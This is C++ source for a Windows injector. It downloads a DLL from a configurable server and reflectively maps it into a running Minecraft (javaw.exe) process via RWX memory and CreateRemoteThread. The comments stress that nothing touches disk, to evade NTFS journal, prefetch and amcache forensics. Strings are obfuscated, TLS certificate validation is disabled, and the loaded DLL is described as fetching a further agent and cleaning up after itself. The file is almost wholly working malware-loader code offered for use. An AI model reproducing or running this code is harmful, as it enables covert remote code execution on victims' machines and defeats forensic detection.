// language: C++20, target: Windows 11, MSVC
// standalone EXE injector — manual maps the loader DLL from memory into
// the Minecraft process. no file is written to disk at any point.
//
// flow:
//   1. downloads DLL bytes from server (same server as agent.jar)
//   2. finds javaw.exe PID
//   3. allocates RWX memory in target process
//   4. writes DLL bytes + reflective loader stub
//   5. CreateRemoteThread → stub parses PE headers, resolves imports,
//      calls DllMain → DLL runs its normal flow (download agent, load JNI, self-cleanup)
//
// the DLL never exists as a file. NTFS journal, prefetch, amcache — nothing to record.

#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <vector>
#include <cstdio>
#include "crypt.h"

#pragma comment(lib, "winhttp.lib")

// --- find minecraft PID ---

static DWORD find_minecraft_pid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"javaw.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"java.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// --- download bytes from server ---

static bool download(const wchar_t* host, const wchar_t* path, int port,
                     std::vector<uint8_t>& out) {
    static constexpr auto enc_ua = WENC(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    auto ua = WDEC(enc_ua);

    HINTERNET session = WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;

    HINTERNET conn = WinHttpConnect(session, host, (INTERNET_PORT)port, 0);
    if (!conn) { WinHttpCloseHandle(session); return false; }

    HINTERNET req = WinHttpOpenRequest(conn, L"GET", path, nullptr,
                                        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        WINHTTP_FLAG_SECURE);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(session); return false; }

    DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
              | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));

    if (!WinHttpSendRequest(req, nullptr, 0, nullptr, 0, 0, 0) ||
        !WinHttpReceiveResponse(req, nullptr)) {
        WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(session);
        return false;
    }

    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(req, &avail) && avail > 0) {
        size_t off = out.size();
        out.resize(off + avail);
        DWORD rd = 0;
        WinHttpReadData(req, out.data() + off, avail, &rd);
        out.resize(off + rd);
    }

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    return !out.empty();
}

// --- reflective loader: maps a PE from raw bytes in the target process ---

// this stub is copied into the target process and runs there.
// it parses the PE in-place, resolves imports, applies relocations, calls DllMain.
// written as position-independent code using only kernel32 functions.

#pragma code_seg(push, ".loader")

// we need a minimal loader that the remote thread can execute.
// since writing a full reflective loader as PIC is complex, we use a simpler
// approach: allocate, copy sections, resolve imports via LoadLibraryA/GetProcAddress
// (which are at known addresses in kernel32, same across processes on same OS boot).

struct ManualMapData {
    LPVOID image_base;
    HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
    FARPROC(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
    BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
};

static DWORD WINAPI loader_stub(ManualMapData* data) {
    if (!data || !data->image_base) return 1;

    auto base = (uint8_t*)data->image_base;
    auto dos = (IMAGE_DOS_HEADER*)base;
    auto nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);

    // resolve imports
    auto imp_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imp_dir.Size) {
        auto imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + imp_dir.VirtualAddress);
        while (imp->Name) {
            char* mod_name = (char*)(base + imp->Name);
            HMODULE mod = data->fnLoadLibraryA(mod_name);

            auto thunk_ref = (IMAGE_THUNK_DATA64*)(base + imp->OriginalFirstThunk);
            auto func_ref  = (IMAGE_THUNK_DATA64*)(base + imp->FirstThunk);

            if (!imp->OriginalFirstThunk)
                thunk_ref = func_ref;

            for (; thunk_ref->u1.AddressOfData; thunk_ref++, func_ref++) {
                if (IMAGE_SNAP_BY_ORDINAL64(thunk_ref->u1.Ordinal)) {
                    func_ref->u1.Function = (ULONGLONG)data->fnGetProcAddress(
                        mod, (LPCSTR)IMAGE_ORDINAL64(thunk_ref->u1.Ordinal));
                } else {
                    auto import = (IMAGE_IMPORT_BY_NAME*)(base + thunk_ref->u1.AddressOfData);
                    func_ref->u1.Function = (ULONGLONG)data->fnGetProcAddress(mod, import->Name);
                }
            }
            imp++;
        }
    }

    // apply relocations
    auto reloc_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (reloc_dir.Size) {
        ULONGLONG delta = (ULONGLONG)base - nt->OptionalHeader.ImageBase;
        auto reloc = (IMAGE_BASE_RELOCATION*)(base + reloc_dir.VirtualAddress);
        while (reloc->VirtualAddress) {
            int count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            auto entries = (WORD*)(reloc + 1);
            for (int i = 0; i < count; i++) {
                if ((entries[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    auto patch = (ULONGLONG*)(base + reloc->VirtualAddress + (entries[i] & 0xFFF));
                    *patch += delta;
                }
            }
            reloc = (IMAGE_BASE_RELOCATION*)((uint8_t*)reloc + reloc->SizeOfBlock);
        }
    }

    // TLS callbacks
    auto tls_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tls_dir.Size) {
        auto tls = (IMAGE_TLS_DIRECTORY64*)(base + tls_dir.VirtualAddress);
        auto callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
        if (callbacks) {
            while (*callbacks) {
                (*callbacks)((PVOID)base, DLL_PROCESS_ATTACH, nullptr);
                callbacks++;
            }
        }
    }

    // call DllMain
    auto entry = (BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID))
        (base + nt->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)base, DLL_PROCESS_ATTACH, nullptr);

    return 0;
}

static void loader_stub_end() {} // marker for size calculation

#pragma code_seg(pop)

// --- main: download DLL, manual map into minecraft ---

int main() {
    // ---- CONFIGURE: your server ----
    static constexpr auto enc_host = WENC(L"127.0.0.1");
    static constexpr auto enc_path = WENC(L"/loader.dll");

    auto host = WDEC(enc_host);
    auto path = WDEC(enc_path);

    printf("[*] downloading loader...\n");
    std::vector<uint8_t> dll_bytes;
    if (!download(host, path, 8443, dll_bytes)) {
        printf("[!] download failed\n");
        return 1;
    }
    printf("[+] downloaded %zu bytes\n", dll_bytes.size());

    // validate PE
    auto dos = (IMAGE_DOS_HEADER*)dll_bytes.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] invalid PE\n");
        return 1;
    }
    auto nt = (IMAGE_NT_HEADERS64*)(dll_bytes.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] invalid PE signature\n");
        return 1;
    }

    // find minecraft
    DWORD pid = find_minecraft_pid();
    if (!pid) {
        printf("[!] minecraft not found\n");
        return 1;
    }
    printf("[+] minecraft PID: %lu\n", pid);

    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!proc) {
        printf("[!] OpenProcess failed (%lu)\n", GetLastError());
        return 1;
    }

    // allocate memory in target for the full image
    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
    LPVOID remote_image = VirtualAllocEx(proc, nullptr, image_size,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_image) {
        printf("[!] VirtualAllocEx failed\n");
        CloseHandle(proc);
        return 1;
    }

    // copy PE headers
    WriteProcessMemory(proc, remote_image, dll_bytes.data(),
                       nt->OptionalHeader.SizeOfHeaders, nullptr);

    // copy sections
    auto section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        if (section->SizeOfRawData) {
            WriteProcessMemory(proc,
                (uint8_t*)remote_image + section->VirtualAddress,
                dll_bytes.data() + section->PointerToRawData,
                section->SizeOfRawData, nullptr);
        }
    }

    // wipe local copy
    SecureZeroMemory(dll_bytes.data(), dll_bytes.size());
    dll_bytes.clear();

    // prepare ManualMapData
    ManualMapData map_data{};
    map_data.image_base = remote_image;

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    map_data.fnLoadLibraryA = (decltype(map_data.fnLoadLibraryA))
        GetProcAddress(k32, "LoadLibraryA");
    map_data.fnGetProcAddress = (decltype(map_data.fnGetProcAddress))
        GetProcAddress(k32, "GetProcAddress");

    // allocate and write map data
    LPVOID remote_data = VirtualAllocEx(proc, nullptr, sizeof(map_data),
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(proc, remote_data, &map_data, sizeof(map_data), nullptr);

    // copy loader stub
    size_t stub_size = (uintptr_t)&loader_stub_end - (uintptr_t)&loader_stub;
    LPVOID remote_stub = VirtualAllocEx(proc, nullptr, stub_size,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(proc, remote_stub, (void*)&loader_stub, stub_size, nullptr);

    // execute
    HANDLE thread = CreateRemoteThread(proc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)remote_stub, remote_data, 0, nullptr);

    if (thread) {
        printf("[+] injected — waiting for loader to finish...\n");
        WaitForSingleObject(thread, 10000);
        CloseHandle(thread);
    }

    // cleanup remote allocations (stub and data, not the image — DLL needs it)
    VirtualFreeEx(proc, remote_data, 0, MEM_RELEASE);
    VirtualFreeEx(proc, remote_stub, 0, MEM_RELEASE);
    CloseHandle(proc);

    printf("[+] done — no files written to disk\n");
    return 0;
}
